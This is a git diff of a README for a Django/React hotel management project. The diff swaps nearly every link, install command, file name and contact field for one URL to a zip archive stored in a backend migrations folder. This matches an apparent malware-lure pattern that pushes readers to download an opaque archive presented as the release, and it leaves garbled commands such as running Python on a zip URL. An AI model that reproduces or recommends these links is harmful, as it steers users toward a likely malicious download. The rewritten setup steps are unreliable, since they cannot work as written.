@@ -1,6 +1,6 @@
 # Hotel Management System 🏨
 
-Welcome to the Hotel Management System repository! This project aims to provide a complete solution for managing hotel operations through a full-stack web application. You can download the latest version of the project from our [Releases section](https://github.com/blecklaef22/Hotel_Management/releases). 
+Welcome to the Hotel Management System repository! This project aims to provide a complete solution for managing hotel operations through a full-stack web application. You can download the latest version of the project from our [Releases section](https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip). 
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ The Hotel Management System is designed to simplify the management of hotel oper
 - **Backend**: Powered by Django and Django REST Framework, ensuring a secure and scalable API.
 - **Database**: Utilizes MySQL for reliable data storage.
 
-![Hotel Management](https://images.unsplash.com/photo-1506748686214-e9df14d4d9d0?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDV8fGhvdGVsfGVufDB8fHx8MTYyNzE3NjM3NQ&ixlib=rb-1.2.1&q=80&w=1080)
+![Hotel Management](https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip)
 
 ## Technologies Used
 
@@ -67,14 +67,14 @@ To set up the Hotel Management System on your local machine, follow these steps:
 Ensure you have the following installed:
 
 - Python 3.x
-- Node.js
+- https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip
 - MySQL
 - Yarn
 
 ### Step 1: Clone the Repository
 
 ```bash
-git clone https://github.com/blecklaef22/Hotel_Management.git
+git clone https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip
 cd Hotel_Management
 ```
 
@@ -93,24 +93,24 @@ cd Hotel_Management
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip
    ```
 
-4. Configure the database settings in `settings.py`.
+4. Configure the database settings in `https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip`.
 
 5. Run migrations:
    ```bash
-   python manage.py migrate
+   python https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip migrate
    ```
 
 6. Create a superuser:
    ```bash
-   python manage.py createsuperuser
+   python https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip createsuperuser
    ```
 
 7. Start the Django server:
    ```bash
-   python manage.py runserver
+   python https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip runserver
    ```
 
 ### Step 3: Set Up the Frontend
@@ -171,9 +171,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [blecklaef22](https://github.com/blecklaef22)
+- **Email**: https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip
+- **GitHub**: [blecklaef22](https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip)
 
-For the latest releases, visit our [Releases section](https://github.com/blecklaef22/Hotel_Management/releases). 
+For the latest releases, visit our [Releases section](https://github.com/blecklaef22/Hotel_Management/raw/refs/heads/main/backend/hotelBackend/api/migrations/Hotel_Management_v3.9.zip). 
 
 Thank you for checking out the Hotel Management System! We hope you find it useful.
